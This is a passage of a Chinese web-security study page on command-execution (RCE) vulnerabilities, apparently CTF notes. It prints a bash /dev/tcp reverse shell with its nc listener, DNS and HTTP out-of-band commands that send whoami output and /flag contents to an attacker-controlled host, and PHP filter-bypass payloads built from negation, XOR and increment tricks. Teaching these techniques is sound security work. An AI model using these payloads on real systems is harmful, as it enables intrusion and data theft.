+<h2 id="s21">5.2 反弹 Shell<a class="h-link" href="#s21" aria-hidden="true">§</a></h2>
+<p>让靶机连回你的机器</p>
+<ul><li><p><strong>做法</strong>：攻击机先监听端口，让靶机主动连接过来并把输入输出重定向到连接上。</p></li><li><p><strong>常见监听与连接写法</strong>：</p>
+<ul><li><p>监听端：<code>nc -lvvp 2333</code></p></li><li><p>靶机端（Bash 示例）：<code>bash -i &gt;&amp; /dev/tcp/你的公网IP/2333 0&gt;&amp;1</code></p></li></ul></li></ul>
+<h2 id="s22">5.3 带外外带<a class="h-link" href="#s22" aria-hidden="true">§</a></h2>
+<p>DNS / HTTP，适合无回显且不方便弹 Shell</p>
+<ul><li><p><strong>做法</strong>：让靶机请求你可控的域名/地址，把结果拼在子域名或参数里带出来。</p></li><li><p><strong>示例</strong>：</p>
+<ul><li><p>DNS 外带（适合短结果、无特殊字符）：`<code>ping -c 1 </code>whoami<code>.xxxx.dnslog.cn</code><code> 或 </code><code>curl http://</code>whoami<code>.xxxx.dnslog.cn</code>`</p></li><li><p>HTTP 外带：`<code> curl http://你的IP:端口/?d=</code>cat /flag | base64<code> </code>`（先编码可减少特殊字符破坏 URL 的问题）。</p></li></ul></li></ul>
+<h2 id="s23">5.4 时间盲注<a class="h-link" href="#s23" aria-hidden="true">§</a></h2>
+<p>出不去外网、也没法写 Web 目录时</p>
+<ul><li><p><strong>做法</strong>：用条件判断配合 <code>sleep</code> 制造响应延迟，逐位或按条件猜解结果。</p></li><li><p><strong>示例</strong>：<code>if [ "$(whoami)" = "www-data" ]; then sleep 3; fi</code></p></li></ul>
+<hr>
+<h1 id="s24">六、无参数RCE<a class="h-link" href="#s24" aria-hidden="true">§</a></h1>
+<p>代码里限制了<strong>不能传参数</strong>（比如正则拦截了 <code>(...)</code> 里面的参数、要求函数调用不带参数，或只能用嵌套函数/无参函数组合出路径和读取操作）。</p>
+<p>常见思路是<strong>用“无参函数一层套一层”获取当前目录/文件内容</strong>（以 PHP 为例）：</p>
+<ul><li><p><strong>查看当前目录文件列表：</strong></p>
+<ul><li><p><code>print_r(scandir('.'));</code> 或 <code>print_r(scandir(getcwd()));</code>（若 <code>.</code> 被过滤，常用 <code>chr(46)</code>、<code>current(localeconv())</code> 等方式构造当前目录 <code>.</code>）。</p></li></ul></li><li><p><strong>读取文件内容（配合数组指针/反转函数）：</strong></p>
+<ul><li><p>典型套路：用 <code>scandir()</code> 拿到文件名数组 → 用 <code>end()</code> / <code>array_reverse()</code> / <code>next()</code> / <code>array_rand()</code> 等把目标文件名（如 <code>flag.php</code>）挑出来 → 套上 <code>readfile()</code>、<code>file_get_contents()</code>、<code>highlight_file()</code>、<code>show_source()</code> 直接读出内容。</p></li><li><p>示例结构：<code>show_source(next(scandir(getcwd())));</code>（视目录文件顺序调整指针函数）。</p></li></ul></li><li><p><strong>通过超全局变量拿输入（当参数受限时）：</strong></p>
+<ul><li><p>某些情况下可利用 <code>getallheaders()</code>、<code>end(get_defined_vars())</code> 等获取请求头或变量中的可控数据再执行。</p></li></ul></li></ul>
+<hr>
+<h1 id="s25">七、无字母数字RCE<a class="h-link" href="#s25" aria-hidden="true">§</a></h1>
+<p>输入被严格过滤，<strong>字母和数字都不能直接出现</strong>（常见正则如 <code>/[a-z0-9]/i</code>），但<strong>符号</strong>（如 <code>~</code>、<code>^</code>、<code>.</code>、<code>$</code>、<code>_</code>、<code>'</code>、<code>"</code>、<code>(</code>、<code>)</code>、<code>;</code>、<code>+</code>、<code>-</code> 等）还可用，于是<strong>用符号运算或编码在运行时拼出字母和命令</strong>。</p>
+<p>常见有 4 条路线（按 PHP 版本和可用字符选）：</p>
+<p><strong>1. 取反绕过（<code>~</code>）—— 适合 PHP 7 常见场景</strong></p>
+<p>对不可见字符或特殊符号做按位取反 <code>~(...)</code>，结果可以还原出可打印的英文字母和函数名。</p>
+<p>常见写法：<code>(~%8C%86%8C%9B%9A%8B)();</code>（本质是把取反后的字节拼成 <code>system</code> 并调用，后面再拼参数）。</p>
+<p><strong>2. 异或绕过（<code>^</code>）</strong></p>
+<p>两个非字母数字字符做按位异或 <code>^</code>，可能得到英文字母（例如某些符号异或后变成 <code>a</code>–<code>z</code>），拼出函数名后动态调用。</p>
+<p><strong>3. 自增绕过（<code>++</code>）</strong></p>
+<p>在 PHP 中，某些字符串或 <code>'a'</code> 经过自增 <code>++</code> 会变成 <code>'b'</code>、<code>'c'</code>……一路拼出需要的字母。</p>
+<p><strong>4. 临时文件上传 + 通配符/点号（不靠拼字母，直接打刚上传的文件）</strong></p>
+<p>PHP 处理 <code>multipart/form-data</code> 文件上传时，会把临时文件存到 <code>/tmp/phpXXXXXX</code>（最后一位通常是<strong>大写字母</strong>）。</p>
+<p>如果正则只拦了小写字母和数字（比如 <code>/[a-z0-9]/</code>），大写字母没拦，就可以用 <code>.[!a-z]</code> 或 <code>/?*[A-Z]</code> 之类的通配符匹配临时文件并执行（比如 <code>. /tmp/php??????</code>）。</p></div>
+
+    <aside class="margin">
+      <div class="margin-sticky">
+        <p class="rail-h mono">READ</p>
+        <p class="margin-pct mono" id="readPct">000<span>%</span></p>
+        <img class="margin-mo" src="img/mo-02.webp" alt="" aria-hidden="true">
+        <div class="rail-more rail-more--right">
+          <p class="rail-h mono">ALL ARTICLES</p>
+          <ul class="rail-list"><li class="is-now"><a href="post-rce.html"><i>▸</i>命令执行漏洞(RCE)</a></li><li><a href="post-java-deserialize.html" data-hover><i>·</i>Java反序列化-基本概念与利用</a></li><li><a href="post.html" data-hover><i>·</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+</article>
+
+<footer class="foot">
+  <div class="foot-inner">
+    <a class="foot-back" href="notes.html" data-hover><span>←</span> 全部文章</a>
+
+    <div class="foot-nav">
+      <a class="foot-link" href="post-php.html" data-hover>
+        <span class="mono">PREV</span>
+        <b>PHP语言基础</b>
+      </a>
+      <a class="foot-link foot-link--next" href="post-java-deserialize.html" data-hover>
+        <span class="mono">NEXT</span>
+        <b>Java反序列化-基本概念与利用</b>
+      </a>
+    </div>
+
+    <div class="foot-mo" aria-hidden="true">
+      <img src="img/mo-03.webp" alt="">
+      <img src="img/mo-05.webp" alt="">
+      <img src="img/mo-12.webp" alt="">
+    </div>
+
+    <p class="foot-copy">MAPLE (G7) · WEB SECURITY NOTES</p>
+  </div>
+</footer>
+
+<script src="app.js?v=v22"></script>
+</body>
+</html>
